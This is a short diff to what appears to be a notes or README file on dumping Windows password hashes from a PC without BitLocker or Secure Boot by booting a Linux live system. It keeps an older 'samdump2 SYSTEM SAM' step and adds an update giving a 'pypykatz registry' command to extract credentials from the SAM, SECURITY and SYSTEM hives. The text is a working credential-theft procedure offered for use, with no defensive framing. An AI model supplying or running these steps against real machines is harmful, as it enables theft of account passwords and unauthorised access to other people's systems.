@@ -5,5 +5,10 @@ If the client PC does not have Bitlocker and Boot or Secure Boot protection;
   2- When opened kaLincox, open terminal and go to "C:\Windows\System32\config" path. Then execute
   
     $ samdump2 SYSTEM SAM
-    
+
+### update; the commands shown above don't work anymore — MSRC fixed them. If you wanna dump the SAM registry, you can use the commands below
+
+  1- cd ../Windows/Windows/System32/config
+  2- pypykatz registry --sam SAM --security SECURITY SYSTEM
+
 cheers
